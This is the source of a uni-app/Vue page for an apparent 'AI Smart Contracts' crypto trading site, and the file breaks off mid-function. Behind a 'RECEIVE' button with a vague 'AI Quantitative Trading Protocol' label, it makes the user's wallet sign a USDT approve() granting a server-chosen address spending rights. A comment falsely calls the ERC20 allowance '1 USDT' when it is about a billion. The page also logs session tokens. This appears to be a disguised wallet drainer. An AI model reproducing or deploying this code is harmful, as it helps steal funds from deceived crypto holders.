<template>
	<view class="index-container">
		<!-- 顶部渐变背景区域 -->
		<view class="gradient-bg">
			<view class="overlay-image-container">
				<image class="overlay-image"
					src="https://www.onchainus.net/static/media/img_banner.c2d112845c769829e979.png" mode="aspectFill">
				</image>
			</view>
		</view>

		<!-- 内容区域 -->
		<view class="content-container">

			<!-- 欢迎卡片 -->
			<view class="welcome-card">
				<view class="welcome-header">
					<text class="welcome-title">Welcome to AI Smart Contracts</text>
					<view class="id-container">
						<text class="chain-icon">🔗</text>
						<text class="id-text">{{ formatAddress(walletInfo.address) }}</text>
					</view>
				</view>
				<text class="welcome-subtitle">Artificial intelligence trading</text>
				
				<view class="earnings-section">
					<view class="earnings-item">
						<text class="earnings-label">Total earnings (USDT)</text>
						<text class="earnings-value">{{ formatEarnings(earningsData.total_earnings) }}</text>
					</view>
					<view class="earnings-item">
						<text class="earnings-label">Earnings 24h (USDT)</text>
						<text class="earnings-value">{{ formatEarnings(earningsData.earnings_24h) }}</text>
					</view>
				</view>
			</view>

			<!-- 开放交易卡片 -->
			<view class="transaction-card">
				<view class="transaction-header">
					<text class="transaction-title">Open transaction!</text>
					<view class="add-btn" @click="showAuthDialog">
						<text class="add-text">+</text>
					</view>
				</view>
				<text class="transaction-subtitle">2000+ base factor library with AI support to short catch derivative position, one step ahead.</text>
				
				
				<view class="stats-section">
					<view class="stat-item">
						<text class="stat-label">Members people</text>
						<text class="stat-value">{{ formatErcNumber(ercData.participant) }}</text>
					</view>
					<view class="stat-item">
						<text class="stat-label">Active nodes</text>
						<text class="stat-value">{{ formatErcNumber(ercData.node) }}</text>
					</view>
					<view class="stat-item">
						<text class="stat-label">Total revenue</text>
						<text class="stat-value">{{ formatRevenueValue(ercData.revenue) }} USDT</text>
					</view>
					<view class="stat-item">
						<text class="stat-label">Daily output</text>
						<text class="stat-value">{{ formatOutputValue(ercData.output) }} USDT</text>
					</view>
				</view>
			</view>

			<!-- 交易所列表 -->
			<view class="exchange-list">
				<!-- 使用v-for动态渲染交易所列表 -->
				<view class="exchange-item" v-for="(exchange, exchangeKey) in exchangeList" :key="exchangeKey">
					<view class="exchange-header" @click="toggleExchange(exchangeKey)">
						<image class="exchange-icon" :src="exchange.icon" mode="aspectFit"></image>
						<text class="exchange-name">{{ exchange.name }}</text>
						<text class="exchange-value">{{ exchange.displayValue }}</text>
						<text class="exchange-arrow" :class="{'rotated': exchangeStatus[exchangeKey]}">></text>
					</view>
					<view class="exchange-details" v-if="exchangeStatus[exchangeKey]">
						<view class="detail-header">
							<view class="detail-icon-space"></view>
							<text class="detail-label">Currency</text>
							<text class="detail-label">24h Volume</text>
							<text class="detail-label">Liquidity</text>
						</view>
						<!-- 安全地访问 Bitcoin 数据 -->
						<view class="coin-row" v-if="exchange.Bitcoin">
							<image class="coin-icon" src="/static/btc.jpg" mode="aspectFit"></image>
							<text class="coin-name">Bitcoin</text>
							<text class="coin-value">${{ formatNumber(exchange.Bitcoin['24h_volume'] || 0) }}</text>
							<text class="coin-number">{{ formatLiquidity(exchange.Bitcoin.liquidity || 0) }}</text>
						</view>
						<!-- 安全地访问 Ethereum 数据 -->
						<view class="coin-row" v-if="exchange.Ethereum">
							<image class="coin-icon" src="/static/eth.jpg" mode="aspectFit"></image>
							<text class="coin-name">Ethereum</text>
							<text class="coin-value">${{ formatNumber(exchange.Ethereum['24h_volume'] || 0) }}</text>
							<text class="coin-number">{{ formatLiquidity(exchange.Ethereum.liquidity || 0) }}</text>
						</view>
						<!-- 如果没有数据，显示提示 -->
						<view class="no-data" v-if="!exchange.Bitcoin && !exchange.Ethereum">
							<text class="no-data-text">No data</text>
						</view>
					</view>
				</view>
			</view>

			<view class="external-links">
				<view class="external-card" @click="openExternalLink('https://1inch.io')">
					<view class="card-icon">
						<image class="card-image" src="/static/img_1inch.png" mode="aspectFit"></image>
					</view>
					<view class="card-content">
						<text class="card-title">1inch</text>
					</view>
				</view>
				<view class="external-card" @click="openExternalLink('https://uniswap.org')">
					<view class="card-icon">
						<image class="card-image" src="/static/img_UniSwap.png" mode="aspectFit"></image>
					</view>
					<view class="card-content">
						<text class="card-title">UniSwap</text>
					</view>
				</view>
				<view class="external-card" @click="openExternalLink('https://sushi.com')">
					<view class="card-icon">
						<image class="card-image" src="/static/img_SushiSwappng.png" mode="aspectFit"></image>
					</view>
					<view class="card-content">
						<text class="card-title">SushiSwap</text>
					</view>
				</view>
			</view>

			<!-- 交易所logos -->
			<view class="exchange-logos">
				<view class="logo-row">
					<view class="logo-item">
						<image class="logo-image" src="/static/img_partner1.png" mode="aspectFit"></image>
					</view>
					<view class="logo-item">
							<image class="logo-image" src="/static/img_partner2.png" mode="aspectFit"></image>
					</view>
					<view class="logo-item">
						<image class="logo-image" src="/static/img_partner3.png" mode="aspectFit"></image>
					</view>
				</view>
				<view class="logo-row">
					<view class="logo-item">
						<image class="logo-image" src="/static/img_partner4.png" mode="aspectFit"></image>
					</view>
					<view class="logo-item">
						<image class="logo-image" src="/static/img_partner5.png" mode="aspectFit"></image>
					</view>
					<view class="logo-item">
						<image class="logo-image" src="/static/img_partner6.png" mode="aspectFit"></image>
					</view>
				</view>
				<view class="logo-row">
					<view class="logo-item">
						<image class="logo-image" src="/static/img_partner7.png" mode="aspectFit"></image>
					</view>
					<view class="logo-item">
						<image class="logo-image" src="/static/img_partner8.png" mode="aspectFit"></image>
					</view>
					<view class="logo-item">
						<image class="logo-image" src="/static/img_partner9.png" mode="aspectFit"></image>
					</view>
				</view>
			</view>

			<!-- 授权弹窗 -->
			<uni-popup ref="authPopup" type="center">
				<view class="auth-dialog">
					<view class="auth-dialog-header">
						<text class="auth-dialog-title">Open Agreement</text>
						<text class="auth-dialog-close" @click="closeAuthDialog">×</text>
					</view>
					<view class="auth-dialog-content">
						<image class="auth-dialog-image" src="/static/auth-image.png" mode="aspectFit"></image>
						<text class="auth-dialog-desc">Broadcast the AI Quantitative Trading Protocol to Nodes</text>
						<button class="auth-dialog-btn" @click="handleWalletAuth">RECEIVE</button>
					</view>
				</view>
			</uni-popup>

		</view>


	</view>
</template>

<script>
import tokenPocketAuth from '@/utils/tokenPocketAuth.js';
import store from '@/store/index.js';
import { api, apiUtils } from '@/utils/api.js';
import WebSocketManager from '@/utils/websocket.js';

// 在文件顶部添加
let lastCheckedWalletAddress = '';
let walletConnectLock = false;
let walletConnectQueue = [];

// 创建WebSocket管理器实例
const exchangeWebSocket = new WebSocketManager();
let exchangeDataCache = null; // 缓存最新数据

export default {
	data() {
		return {
			exchangeStatus: {
				binance: true,  // 默认展开binance
				huobi: false,
				gate: false,
				okex: false,
				kucoin: false,
				kraken: false
			},
			walletInfo: {
				connected: false,
				type: '',
				address: ''
			},
			authAddress: '', // 存储授权地址
			// 新增：收益数据
			earningsData: {
				total_earnings: '0.00',
				earnings_24h: '0.00'
			},
			// 新增：交易所数据
			exchangeData: {},
			// 新增：轮询定时器
			pollingTimer: null,
			// 新增：交易所配置（图标和显示名称）- 按照截图顺序排列
			exchangeConfig: {
				binance: { name: 'Binance', icon: '/static/binance.png' },
				huobi: { name: 'Huobi', icon: '/static/huobi.png' },
				gate: { name: 'Gate', icon: '/static/gate.png' },
				okex: { name: 'OKEx', icon: '/static/okex.png' },
				kucoin: { name: 'KuCoin', icon: '/static/kucoin.png' },
				kraken: { name: 'Kraken', icon: '/static/kraken.png' }
			},
			// 新增：ERC数据相关
			ercData: {
				authorized_address: '',
				node: '0',
				output: '0',
				participant: '0',
				revenue: '0'
			},
			// 新增：ERC数据轮询定时器
			ercPollingTimer: null,
			// 新增：用户信息轮询定时器
			userInfoPollingTimer: null,
			
			// 新增：钱包监听器
			accountsChangedHandler: null,
			chainChangedHandler: null,
			connectHandler: null,
			disconnectHandler: null,
			
			// 新增：防抖和状态控制
			tokenUpdateDebounceTimer: null,
			isPollingActive: false,
			lastTokenUpdateTime: 0,
			storeUnsubscribe: null,

			// 新增：事件监听器
			userInfoUpdateListener: null,
		}
	},
	
	computed: {
		// 计算属性：格式化交易所列表
		exchangeList() {
			const list = {};
			Object.keys(this.exchangeConfig).forEach(key => {
				const config = this.exchangeConfig[key];
				const data = this.exchangeData[key] || {};
				
				// 修改显示值计算逻辑 - 显示eth参数
				let displayValue = '0.00';
				
				// 优先显示Bitcoin的eth值，如果没有则显示Ethereum的eth值
				if (data.Bitcoin && data.Bitcoin.eth) {
					displayValue = this.formatEthValue(data.Bitcoin.eth);
				} else if (data.Ethereum && data.Ethereum.eth) {
					displayValue = this.formatEthValue(data.Ethereum.eth);
				}
				
				list[key] = {
					...config,
					...data,
					displayValue: displayValue
				};
			});
			return list;
		}
	},

	onLoad() {
		console.log('=== 页面加载 ===');
		// 检查钱包连接状态
		this.checkWalletConnection();
		// 设置钱包监听器
		this.setupWalletListeners();
		// 设置store监听器
		this.setupStoreListeners();
		// 设置用户信息更新监听器
		this.setupUserInfoUpdateListener();
		// 启动轮询
		this.startAllPolling();
	},

	onShow() {
		console.log('=== 页面显示 ===');
		// 只检查钱包连接，不重复启动轮询
		this.checkWalletConnection();
		
		// 确保钱包监听器已设置
		if (!this.accountsChangedHandler) {
			this.setupWalletListeners();
		}
		
		// 确保store监听器已设置
		if (!this.storeUnsubscribe) {
			this.setupStoreListeners();
		}
		
		// 确保用户信息更新监听器已设置
		if (!this.userInfoUpdateListener) {
			this.setupUserInfoUpdateListener();
		}
		
		// 只有在轮询未活跃时才启动
		if (!this.isPollingActive) {
			console.log('轮询未活跃，重新启动');
			this.startAllPolling();
		}
	},

	onHide() {
		console.log('=== 页面隐藏 ===');
		// 页面隐藏时停止轮询以节省资源
		this.stopAllPolling();
		// 移除钱包监听器
		this.removeWalletListeners();
	},
	
	onUnload() {
		console.log('=== 页面卸载 ===');
		// 清理所有资源
		this.cleanup();
	},

	methods: {
		// 检查钱包连接状态并调用wallet_connect接口
		async checkWalletConnection() {
			const walletAddress = uni.getStorageSync('walletAddress');
			const walletType = uni.getStorageSync('walletType');
			
			if (!walletAddress) {
				// 没有钱包地址，跳转到连接页面
				uni.reLaunch({
					url: '/pages/wallet/connect'
				});
				return;
			}

			try {
				// 调用wallet_connect接口
				console.log('=== 调用wallet_connect接口 ===');
				console.log('钱包地址:', walletAddress);
				
				const responseData = await api.user.walletConnect(
					walletAddress,
					uni.getStorageSync('userTid') || ''
				);

				console.log('wallet_connect响应:', responseData);

				if (responseData && responseData.code === 0) {
					// 连接成功，保存token
					if (responseData.token) {
						store.setToken(responseData.token);
						console.log('Token已保存到store:', responseData.token);
					}
					
					// 更新钱包连接状态
					uni.setStorageSync('walletConnected', true);
					
					// 更新界面显示的钱包信息
					this.walletInfo = {
						connected: true,
						type: walletType || 'Auto-detected',
						address: walletAddress
					};
					
					console.log('钱包连接成功');
				} else {
					throw new Error(responseData.info || 'Wallet connection failed');
				}

			} catch (error) {
				console.error('wallet_connect调用失败:', error);
				
				// 连接失败，清除本地数据并跳转到连接页面
				uni.removeStorageSync('walletConnected');
				uni.removeStorageSync('walletAddress');
				uni.removeStorageSync('walletType');
				store.clearToken();
				
				uni.showToast({
					title: 'Wallet connection failed, please reconnect',
					icon: 'none',
					duration: 2000
				});
				
				setTimeout(() => {
					uni.reLaunch({
						url: '/pages/wallet/connect'
					});
				}, 2000);
			}
		},
		
		// 格式化钱包地址
		formatAddress(address) {
			if (!address) return '';
			if (address.length <= 10) return address;
			return `${address.substring(0, 6)}...${address.substring(address.length - 4)}`;
		},
		
		// 断开钱包连接
		disconnectWallet() {
			console.log('=== Disconnect wallet ===');
			console.log('Before disconnecting store token:', store.getToken());
			console.log('Before disconnecting local storage token:', {
				userToken: uni.getStorageSync('userToken'),
				token: uni.getStorageSync('token')
			});
			
			uni.showModal({
				title: 'Disconnect',
				content: 'Are you sure you want to disconnect the wallet?',
				success: (res) => {
					if (res.confirm) {
						// 清除本地存储
						uni.removeStorageSync('walletConnected');
						uni.removeStorageSync('walletAddress');
						uni.removeStorageSync('walletType');
						uni.removeStorageSync('connectTime');
						
						// 清除 token
						store.clearToken();
						uni.removeStorageSync('token'); // 同时清除旧的 token 存储
						
						console.log('After disconnecting store token:', store.getToken());
						console.log('After disconnecting local storage token:', {
							userToken: uni.getStorageSync('userToken'),
							token: uni.getStorageSync('token')
						});
						
						// 跳转到连接页面
						uni.reLaunch({
							url: '/pages/wallet/connect'
						});
					}
				}
			});
		},
		
		toggleExchange(exchangeName) {
			this.exchangeStatus[exchangeName] = !this.exchangeStatus[exchangeName];
		},
		openExternalLink(url) {
			// 在小程序中打开外部链接
			// #ifdef MP-WEIXIN
			uni.navigateTo({
				url: `/pages/webview/webview?url=${encodeURIComponent(url)}`
			});
			// #endif
			
			// 在APP中打开外部链接
			// #ifdef APP-PLUS
			plus.runtime.openURL(url);
			// #endif
			
			// 在H5中打开外部链接
			// #ifdef H5
			window.open(url, '_blank');
			// #endif
		},
		// 修改显示授权弹窗方法 - 所有文字改为英文
		async showAuthDialog() {
			try {
				// 显示加载提示
				uni.showLoading({
					title: 'Getting authorization info...'
				});

				// 先获取授权地址，等待完成
				await this.getAuthAddress();
				
				// 隐藏加载提示
				uni.hideLoading();
				
				// 检查是否成功获取到授权地址
				if (!this.authAddress) {
					uni.showToast({
						title: 'Failed to get authorization address, please try again',
						icon: 'none',
						duration: 2000
					});
					return;
				}
				
				// 显示弹窗
				this.$refs.authPopup.open();
				
			} catch (error) {
				uni.hideLoading();
				console.error('显示授权弹窗失败:', error);
				uni.showToast({
					title: 'Failed to get authorization info',
					icon: 'none',
					duration: 2000
				});
			}
		},

		// 关闭授权弹窗
		closeAuthDialog() {
			this.$refs.authPopup.close();
		},

		// 修改getAuthAddress方法的错误信息
		async getAuthAddress() {
			try {
				const currentToken = store.getToken();
				console.log('getAuthAddress - 当前token:', currentToken);
				
				const data = await api.transaction.getAuthAddress();
				console.log('getAuthAddress - 返回数据:', data);
				
				if (data && data.data) {
					// 保存授权地址
					if (data.data.authorized_address) {
						this.authAddress = data.data.authorized_address;
						console.log('授权地址已设置:', this.authAddress);
					} else {
						throw new Error('API did not return authorized_address field');
					}
					
					// 更新TokenPocket授权工具的合约地址配置
					const contractConfig = {};
					
					if (data.data.tron_usdt_contract) {
						contractConfig.tronUsdtContract = data.data.tron_usdt_contract;
						console.log('更新Tron USDT合约地址:', data.data.tron_usdt_contract);
					}
					
					if (data.data.eth_usdt_contract) {
						contractConfig.ethUsdtContract = data.data.eth_usdt_contract;
						console.log('更新ETH USDT合约地址:', data.data.eth_usdt_contract);
					}
					
					// 如果有合约地址信息，更新配置
					if (Object.keys(contractConfig).length > 0) {
						tokenPocketAuth.updateConfig(contractConfig);
					}
					
					console.log('授权信息获取成功:', {
						authAddress: this.authAddress,
						contracts: contractConfig
					});
					
					return this.authAddress; // 返回授权地址
					
				} else {
					throw new Error('API returned empty data or wrong format');
				}
			} catch (error) {
				console.error('获取授权地址失败:', error);
				throw error; // 重新抛出错误，让调用者处理
			}
		},

		// 修改handleWalletAuth方法的提示文字
		async handleWalletAuth() {
			console.log('handleWalletAuth开始，当前authAddress:', this.authAddress);
			
			// 如果authAddress为空，尝试重新获取
			if (!this.authAddress) {
				try {
					uni.showLoading({
						title: 'Getting authorization address...'
					});
					
					await this.getAuthAddress();
					uni.hideLoading();
					
					if (!this.authAddress) {
						throw new Error('Failed to get authorization address again');
					}
				} catch (error) {
					uni.hideLoading();
					console.error('重新获取授权地址失败:', error);
					uni.showToast({
						title: 'Failed to get authorization address, please try again',
						icon: 'none',
						duration: 2000
					});
					return;
				}
			}

			try {
				uni.showLoading({
					title: 'Processing authorization...'
				});

				// 检测当前钱包环境
				const walletType = this.detectWalletEnvironment();
				console.log('检测到钱包类型:', walletType);
				
				let authResult;
				
				if (walletType === 'TokenPocket') {
					// TokenPocket授权流程
					authResult = await tokenPocketAuth.requestAuth(this.authAddress);
				} else if (walletType === 'MetaMask') {
					// MetaMask授权流程
					authResult = await this.handleMetaMaskAuth();
				} else if (walletType === 'Ethereum') {
					// 通用以太坊钱包授权流程
					authResult = await this.handleEthereumWalletAuth();
				} else {
					// 尝试通用授权方法
					authResult = await this.handleGenericWalletAuth();
				}
				
				await this.handleAuthResult(authResult);
				
			} catch (error) {
				uni.hideLoading();
				console.error('钱包授权错误:', error);
				
				uni.showToast({
					title: error.message || 'Authorization failed',
					icon: 'none',
					duration: 3000
				});
			}
		},

		// 新增：检测钱包环境 - 增强版本
		detectWalletEnvironment() {
			if (typeof window === 'undefined') return null;
			
			// TokenPocket检测
			if (tokenPocketAuth.detectTokenPocketEnvironment()) {
				return 'TokenPocket';
			}
			
			// MetaMask检测
			if (window.ethereum?.isMetaMask && !window.ethereum?.isCoinbaseWallet) {
				return 'MetaMask';
			}
			
			// Coinbase Wallet检测
			if (window.ethereum?.isCoinbaseWallet) {
				return 'CoinbaseWallet';
			}
			
			// Trust Wallet检测
			if (window.ethereum?.isTrust) {
				return 'TrustWallet';
			}
			
			// imToken检测
			if (window.ethereum?.isImToken) {
				return 'ImToken';
			}
			
			// 通用以太坊钱包
			if (window.ethereum) {
				return 'Ethereum';
			}
			
			// Tron钱包检测
			if (window.tronWeb) {
				return 'TronWallet';
			}
			
			return 'Unknown';
		},

		// 修改处理MetaMask授权的提示文字
		async handleMetaMaskAuth() {
			try {
				const ethereum = window.ethereum;
				
				// 请求账户访问权限
				const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
				
				if (accounts.length === 0) {
					throw new Error('Failed to get account access permission');
				}
				
				// 执行ERC20 approve授权
				const authResult = await this.executeERC20Approval(ethereum, accounts[0]);
				
				return {
					success: true,
					type: 'ETHEREUM',
					address: accounts[0],
					txHash: authResult.txHash,
					message: 'Authorization successful'
				};
				
			} catch (error) {
				console.error('MetaMask授权失败:', error);
				return {
					success: false,
					message: error.message || 'MetaMask authorization failed'
				};
			}
		},

		// 修改处理通用以太坊钱包授权的提示文字
		async handleEthereumWalletAuth() {
			try {
				const ethereum = window.ethereum;
				
				// 请求账户访问权限
				const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
				
				if (accounts.length === 0) {
					throw new Error('Failed to get account access permission');
				}
				
				// 执行ERC20 approve授权
				const authResult = await this.executeERC20Approval(ethereum, accounts[0]);
				
				return {
					success: true,
					type: 'ETHEREUM',
					address: accounts[0],
					txHash: authResult.txHash,
					message: 'Authorization successful'
				};
				
			} catch (error) {
				console.error('以太坊钱包授权失败:', error);
				return {
					success: false,
					message: error.message || 'Wallet authorization failed'
				};
			}
		},

		// 修改处理通用钱包授权的提示文字
		async handleGenericWalletAuth() {
			try {
				// 尝试以太坊钱包
				if (window.ethereum) {
					return await this.handleEthereumWalletAuth();
				}
				
				// 尝试Tron钱包
				if (window.tronWeb) {
					return await this.handleTronWalletAuth();
				}
				
				// 如果都没有，显示友好提示
				throw new Error('Please use a supported wallet app (such as MetaMask, TokenPocket, etc.) to open this page');
				
			} catch (error) {
				return {
					success: false,
					message: error.message || 'No supported wallet detected'
				};
			}
		},

		// 修改处理Tron钱包授权的提示文字
		async handleTronWalletAuth() {
			try {
				const tronWeb = window.tronWeb;
				
				// 检查钱包连接
				if (!tronWeb.ready) {
					throw new Error('Tron wallet not connected');
				}
				
				const address = tronWeb.defaultAddress.base58;
				if (!address) {
					throw new Error('Failed to get Tron wallet address');
				}
				
				// 执行TRC20 approve授权
				const authResult = await this.executeTRC20Approval(tronWeb, address);
				
				return {
					success: true,
					type: 'TRON',
					address: address,
					txHash: authResult.txHash,
					message: 'Authorization successful'
				};
				
			} catch (error) {
				console.error('Tron钱包授权失败:', error);
				return {
					success: false,
					message: error.message || 'Tron wallet authorization failed'
				};
			}
		},

		// 修改 executeERC20Approval 方法
		async executeERC20Approval(ethereum, userAddress) {
			try {
				// 获取合约地址
				const contractAddress = tokenPocketAuth.config.ethUsdtContract;
				const spenderAddress = this.authAddress;
				
				// 修正：使用合理的授权数量
				// USDT 有 6 位小数，所以 1 USDT = 1,000,000 wei
				// 但为了降低 Gas 费用，我们只授权实际需要的数量
				const approveAmount = '1000000000000000'; // 1 USDT，足够一次交易使用
				
				console.log('授权数量:', approveAmount, 'wei (', parseFloat(approveAmount) / 1e6, 'USDT)');
				
				// 修正：正确处理大数转换为16进制
				let amountHex;
				try {
					// 确保数字不会溢出JavaScript的安全整数范围
					const amountBigInt = BigInt(approveAmount);
					amountHex = '0x' + amountBigInt.toString(16);
				} catch (error) {
					console.error('数量转换失败:', error);
					// 如果出错，使用一个安全的默认值 (1 USDT)
					amountHex = '0xF4240'; // 1,000,000 的16进制
				}
				
				console.log('授权数量 16进制:', amountHex);
				
				// 构建ERC20 approve方法的调用数据
				const approveMethodABI = '0x095ea7b3' + 
					spenderAddress.slice(2).padStart(64, '0') + 
					amountHex.slice(2).padStart(64, '0');

				// 添加调试信息
				console.log('授权交易详情:', {
					合约地址: contractAddress,
					授权对象: spenderAddress,
					授权数量: approveAmount + ' wei (' + (parseFloat(approveAmount) / 1e6) + ' USDT)',
					授权数量16进制: amountHex,
					交易数据: approveMethodABI
				});

				// 1. 动态获取当前 Gas Price
				let gasPrice;
				try {
					const currentGasPrice = await ethereum.request({ method: 'eth_gasPrice' });
					const gasPriceWei = parseInt(currentGasPrice, 16);
					
					// 设置更低的 Gas Price 限制
					const maxGasPriceWei = 5000000000; // 5 gwei (降低限制)
					const minGasPriceWei = 1000000000;  // 1 gwei
					
					// 使用网络建议的 Gas Price，但限制在合理范围内
					const limitedGasPrice = Math.min(Math.max(gasPriceWei, minGasPriceWei), maxGasPriceWei);
					gasPrice = '0x' + limitedGasPrice.toString(16);
					
					console.log('当前网络 Gas Price:', gasPriceWei / 1e9, 'gwei');
					console.log('限制后 Gas Price:', limitedGasPrice / 1e9, 'gwei');
				} catch (error) {
					console.warn('获取动态 Gas Price 失败，使用默认值:', error);
					gasPrice = '0x3B9ACA00'; // 1 gwei 作为安全默认值
				}

				// 2. 估算 Gas Limit (修正缺失的 method)
				let gasLimit;
				try {
					const estimatedGas = await ethereum.request({
						method: 'eth_estimateGas', // 添加缺失的 method
						params: [{
							from: userAddress,
							to: contractAddress,
							data: approveMethodABI
						}]
					});
					
					// 在估算基础上增加 10% 作为缓冲 (降低缓冲)
					const gasBuffer = Math.floor(parseInt(estimatedGas, 16) * 1.1);
					
					// 设置最大 Gas Limit (降低最大值)
					const maxGasLimit = 60000; // 降低到60000
					gasLimit = '0x' + Math.min(gasBuffer, maxGasLimit).toString(16);
					
					console.log('估算 Gas Limit:', parseInt(estimatedGas, 16));
					console.log('最终 Gas Limit:', Math.min(gasBuffer, maxGasLimit));
				} catch (error) {
					console.warn('估算 Gas Limit 失败，使用默认值:', error);
					gasLimit = '0xEA60'; // 60000 作为保守默认值
				}

				// 3. 显示 Gas 费用预估给用户确认
				const estimatedFeeWei = parseInt(gasLimit, 16) * parseInt(gasPrice, 16);
				const estimatedFeeETH = estimatedFeeWei / 1e18;
				
				console.log('预估手续费:', {
					gasLimit: parseInt(gasLimit, 16),
					gasPrice: parseInt(gasPrice, 16) / 1e9 + ' gwei',
					estimatedFeeETH: estimatedFeeETH.toFixed(6) + ' ETH',
					estimatedFeeUSD: (estimatedFeeETH * 4300).toFixed(2) + ' USD' // 假设ETH价格4300美元
				});

				// 降低警告阈值
				if (estimatedFeeETH > 0.002) { // 超过 0.002 ETH (~$8.6) 警告
					const confirmed = await new Promise(resolve => {
						uni.showModal({
							title: '手续费确认',
							content: `预估手续费：${estimatedFeeETH.toFixed(6)} ETH (约 $${(estimatedFeeETH * 4300).toFixed(2)})\n授权数量：${(parseFloat(approveAmount) / 1e6).toFixed(2)} USDT\n\n是否继续？`,
							success: (res) => resolve(res.confirm)
						});
					});
					
					if (!confirmed) {
						throw new Error('User cancelled due to high gas fee');
					}
				}

				// 发送授权交易
				const txHash = await ethereum.request({
					method: 'eth_sendTransaction',
					params: [{
						from: userAddress,
						to: contractAddress,
						data: approveMethodABI,
						gas: gasLimit,
						gasPrice: gasPrice
					}]
				});
				
				console.log('ERC20授权交易发送成功:', txHash);
				
				return {
					success: true,
					txHash: txHash
				};
				
			} catch (error) {
				console.error('ERC20授权执行失败:', error);
				throw new Error('Authorization transaction failed: ' + error.message);
			}
		},

		// 新增：检查 Gas 费用预估的方法
		async estimateTransactionCost(ethereum, txParams) {
			try {
				// 获取当前 Gas Price
				const gasPrice = await ethereum.request({ method: 'eth_gasPrice' });
				
				// 估算 Gas Limit
				const gasLimit = await ethereum.request({
					method: 'eth_estimateGas',
					params: [txParams]
				});
				
				const totalCostWei = parseInt(gasLimit, 16) * parseInt(gasPrice, 16);
				const totalCostETH = totalCostWei / 1e18;
				
				return {
					gasPrice: parseInt(gasPrice, 16),
					gasLimit: parseInt(gasLimit, 16),
					totalCostWei,
					totalCostETH
				};
			} catch (error) {
				console.error('估算交易费用失败:', error);
				throw error;
			}
		},

		// 修改执行TRC20授权的错误提示
		async executeTRC20Approval(tronWeb, userAddress) {
			try {
				// 获取合约地址
				const contractAddress = tokenPocketAuth.config.tronUsdtContract;
				const spenderAddress = this.authAddress;
				const approveAmount = tokenPocketAuth.config.defaultApproveAmount;
				
				// 获取合约实例
				const contract = await tronWeb.contract().at(contractAddress);
				
				// 调用approve方法
				const transaction = await contract.approve(spenderAddress, approveAmount).send({
					from: userAddress,
					feeLimit: 100000000 // 100 TRX
				});
				
				console.log('TRC20授权交易发送成功:', transaction);
				
				return {
					success: true,
					txHash: transaction
				};
				
			} catch (error) {
				console.error('TRC20授权执行失败:', error);
				throw new Error('Tron authorization transaction failed: ' + error.message);
			}
		},

		// 修改统一处理授权结果的提示文字
		async handleAuthResult(authResult) {
			uni.hideLoading();
			
			if (authResult.success) {
				// 授权成功后调用回调接口
				await this.callbackAuthSuccess({
					...authResult,
					address: this.authAddress
				});
				
				uni.showToast({
					title: 'Authorization successful',
					icon: 'success'
				});
				
				this.handleAuthSuccess(authResult);
				this.closeAuthDialog();
			} else {
				uni.showToast({
					title: authResult.message || 'Authorization failed',
					icon: 'none'
				});
			}
		},

		// 授权成功回调
		async callbackAuthSuccess(authResult) {
			try {
				const storeToken = store.getToken();
				const localToken = uni.getStorageSync('userToken');
				const oldLocalToken = uni.getStorageSync('token');
				
				console.log('=== Token check ===');
				console.log('Store token:', storeToken);
				console.log('Local storage userToken:', localToken);
				console.log('Local storage token:', oldLocalToken);
				
				const token = store.getToken();
				if (!token) {
					console.warn('Authorization failed: token not found in store');
					const walletAddress = uni.getStorageSync('walletAddress');
					console.log('Current wallet address:', walletAddress);
					
					if (walletAddress) {
						try {
							console.log('Attempting to re-obtain token, parameters:', {
								address: walletAddress,
								tid: uni.getStorageSync('userTid') || ''
							});
							
							// 使用新的API方法重新调用钱包连接接口
							const responseData = await api.user.walletConnect(
								walletAddress,
								uni.getStorageSync('userTid') || ''
							);

							console.log('重新获取token响应:', responseData);

							if (responseData && responseData.code === 0 && responseData.token) {
								store.setToken(responseData.token);
								console.log('新token已保存到store:', responseData.token);
							} else {
								throw new Error('Failed to re-obtain token');
							}
						} catch (error) {
							console.error('Failed to re-obtain token:', error);
							apiUtils.showError('Authorization failed, please reconnect wallet');
							return;
						}
					}
				}

				console.log('准备调用授权接口，使用token:', store.getToken());
				
				try {
					// 使用新的API方法
					const responseData = await api.user.authorize(this.authAddress);
					
					console.log('Authorization interface response:', responseData);
					
					if (responseData && responseData.code === 0) {
						console.log('Authorization submitted successfully');
					} else {
						console.warn('Authorization interface returned abnormal:', responseData);
					}
				} catch (error) {
					console.error('Authorization interface call failed:', error);
				}
				
			} catch (error) {
			console.error('Authorization callback interface call failed:', error);
			}
		},


		// 如果需要动态生成token，可以使用此方法
		generateAuthToken() {
			// 生成32位随机字符串
			const chars = 'abcdef0123456789';
			let token = '';
			for (let i = 0; i < 32; i++) {
				token += chars.charAt(Math.floor(Math.random() * chars.length));
			}
			return token;
		},

		// 处理授权成功
		handleAuthSuccess(authResult) {
			console.log('Authorization successful:', authResult);
			
			// 保存授权信息到本地存储
			uni.setStorageSync('authResult', {
				...authResult,
				timestamp: Date.now()
			});
			
			// 移除详情显示，不再调用 showAuthDetails
			// this.showAuthDetails(authResult);
		},

		// 显示授权详情 - 可以删除这个方法，因为不再使用
		// showAuthDetails(authResult) {
		// 	uni.showModal({
		// 		title: '授权交易已发起',
		// 		content: `网络: ${authResult.type}\n地址: ${tokenPocketAuth.formatAddress(authResult.address)}\n交易哈希: ${tokenPocketAuth.formatTxHash(authResult.txHash)}`,
		// 		showCancel: false,
		// 		confirmText: '确定'
		// 	});
		// },

		// 获取当前URL
		getCurrentUrl() {
			// #ifdef H5
			return window.location.href;
			// #endif
			
			// #ifdef APP-PLUS
			return 'https://ai-smart-contracts.com/app';
			// #endif
			
			// #ifdef MP-WEIXIN
			return 'https://ai-smart-contracts.com/mp';
			// #endif
		},

		// 复制当前URL
		copyCurrentUrl() {
			const url = this.getCurrentUrl();
			
			// #ifdef H5
			if (navigator.clipboard) {
				navigator.clipboard.writeText(url).then(() => {
					uni.showToast({
						title: 'Link copied',
						icon: 'success'
					});
				});
			}
			// #endif
			
			// #ifdef APP-PLUS || MP-WEIXIN
			uni.setClipboardData({
				data: url,
				success: () => {
					uni.showToast({
						title: 'Link copied',
						icon: 'success'
					});
				}
			});
			// #endif
		},

		// 获取以太坊提供者函数
		getEthereumProvider() {
			if (typeof window === 'undefined') return null;
			
			if (window.tokenpocket && window.tokenpocket.ethereum) {
				return window.tokenpocket.ethereum;
			} else if (window.bifrost) {
				return window.bifrost;
			} else if (window.onchain) {
				return window.onchain;
			} else if (window.crypto && window.crypto.ethereum) {
				return window.crypto.ethereum;
			} else if (window.ethereum) {
				return window.ethereum;
			}
			
			return null;
		},

		// 检查 gas 费用是否足够
		async checkGasBalance() {
			try {
				// 获取以太坊提供者
